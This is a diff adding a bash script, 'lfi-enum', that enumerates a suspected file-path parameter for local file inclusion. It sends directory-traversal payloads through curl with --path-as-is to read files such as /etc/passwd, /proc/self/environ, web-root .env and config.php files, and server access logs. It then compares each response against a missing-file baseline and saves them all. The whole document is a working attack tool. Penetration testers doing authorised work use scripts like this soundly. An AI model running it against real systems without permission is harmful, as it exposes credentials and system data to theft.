@@ -1,0 +1,127 @@
+#!/usr/bin/env bash
+# Small, read-only GET enumerator for a suspected file-path parameter.
+set -euo pipefail
+
+usage() {
+  cat <<'EOF'
+Usage: lfi-enum -u 'http://target/page?file=FUZZ' [-d 6] [-w paths.txt]
+                [-o new-output-dir] [-b cookies.txt] [-H 'Header: value'] [-k]
+
+FUZZ must be in the URL. Depth 0 tries each path as written; depths 1..N
+prepend ../ after removing one leading slash. All responses are saved.
+Use -H more than once for headers such as Host or Authorization.
+EOF
+}
+
+url=''
+wordlist=''
+output_dir=''
+depth=6
+cookie_file=''
+curl_extra=()
+
+while (($#)); do
+  case "$1" in
+    -u|--url) (($# >= 2)) || { usage >&2; exit 2; }; url=$2; shift 2 ;;
+    -w|--wordlist) (($# >= 2)) || { usage >&2; exit 2; }; wordlist=$2; shift 2 ;;
+    -o|--output) (($# >= 2)) || { usage >&2; exit 2; }; output_dir=$2; shift 2 ;;
+    -d|--depth) (($# >= 2)) || { usage >&2; exit 2; }; depth=$2; shift 2 ;;
+    -b|--cookie-file) (($# >= 2)) || { usage >&2; exit 2; }; cookie_file=$2; shift 2 ;;
+    -H|--header) (($# >= 2)) || { usage >&2; exit 2; }; curl_extra+=(--header "$2"); shift 2 ;;
+    -k|--insecure) curl_extra+=(--insecure); shift ;;
+    -h|--help) usage; exit 0 ;;
+    *) printf 'Unknown option: %s\n' "$1" >&2; usage >&2; exit 2 ;;
+  esac
+done
+
+[[ -n $url && $url == *FUZZ* ]] || { printf 'URL must contain FUZZ.\n' >&2; usage >&2; exit 2; }
+[[ $depth =~ ^[0-9]+$ ]] && ((depth <= 20)) || { printf 'Depth must be 0..20.\n' >&2; exit 2; }
+command -v curl >/dev/null || { printf 'curl is required.\n' >&2; exit 2; }
+[[ -z $wordlist || -f $wordlist ]] || { printf 'Wordlist not found: %s\n' "$wordlist" >&2; exit 2; }
+[[ -z $cookie_file || -f $cookie_file ]] || { printf 'Cookie file not found: %s\n' "$cookie_file" >&2; exit 2; }
+if [[ -n $cookie_file ]]; then curl_extra+=(--cookie "$cookie_file"); fi
+
+paths=()
+if [[ -n $wordlist ]]; then
+  while IFS= read -r path || [[ -n $path ]]; do
+    path=${path%$'\r'}
+    [[ -z $path || $path == \#* ]] && continue
+    paths+=("$path")
+  done < "$wordlist"
+else
+  readarray -t paths <<'EOF'
+/etc/passwd
+/etc/hostname
+/etc/hosts
+/proc/self/status
+/proc/self/cmdline
+/proc/self/environ
+/var/www/html/index.php
+/var/www/html/.env
+/var/www/html/config.php
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+EOF
+fi
+((${#paths[@]})) || { printf 'Wordlist has no paths.\n' >&2; exit 2; }
+
+umask 077
+if [[ -z $output_dir ]]; then
+  output_dir=$(mktemp -d "lfi-results-$(date +%Y%m%d-%H%M%S)-XXXXXX")
+else
+  mkdir -m 700 -- "$output_dir"
+fi
+printf 'id\tdepth\tstatus\tbytes\tcomparison\tpayload\tbody\n' > "$output_dir/results.tsv"
+printf 'Saving responses in %s\n' "$output_dir"
+printf '%-6s %-5s %-7s %-9s %-5s %s\n' ID DEPTH STATUS BYTES COMPARE PAYLOAD
+
+fetch() {
+  local payload=$1 body=$2 request_url=${url//FUZZ/$1}
+  : > "$body"
+  if response_status=$(curl --silent --show-error --globoff --path-as-is \
+      --connect-timeout 5 --max-time 10 --output "$body" --write-out '%{http_code}' \
+      "${curl_extra[@]}" "$request_url"); then
+    :
+  else
+    response_status=ERR
+  fi
+  response_bytes=$(wc -c < "$body")
+}
+
+count=0
+errors=0
+for ((d=0; d<=depth; d++)); do
+  prefix=''
+  for ((i=0; i<d; i++)); do prefix+='../'; done
+  missing="lfi-missing-${RANDOM}-${RANDOM}"
+  if ((d == 0)); then control_payload="/$missing"; else control_payload="${prefix}${missing}"; fi
+  control_body="$output_dir/baseline-depth-${d}.body"
+  fetch "$control_payload" "$control_body"
+  control_status=$response_status
+  control_bytes=$response_bytes
+
+  for path in "${paths[@]}"; do
+    if ((d == 0)); then payload=$path; else payload="${prefix}${path#/}"; fi
+    count=$((count + 1))
+    printf -v id '%04d' "$count"
+    body="$output_dir/${id}.body"
+    fetch "$payload" "$body"
+    if [[ $response_status == ERR ]]; then
+      comparison=error
+      errors=$((errors + 1))
+    elif [[ $response_status == "$control_status" && $response_bytes == "$control_bytes" ]]; then
+      comparison=same
+    else
+      comparison=DIFF
+    fi
+    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+      "$id" "$d" "$response_status" "$response_bytes" "$comparison" "$payload" "$body" \
+      >> "$output_dir/results.tsv"
+    printf '%-6s %-5s %-7s %-9s %-5s %s\n' \
+      "$id" "$d" "$response_status" "$response_bytes" "$comparison" "$payload"
+  done
+done
+
+printf 'Wrote %s responses and %s missing-file controls to %s\n' \
+  "$count" "$((depth + 1))" "$output_dir"
+if ((errors == count)); then exit 1; fi
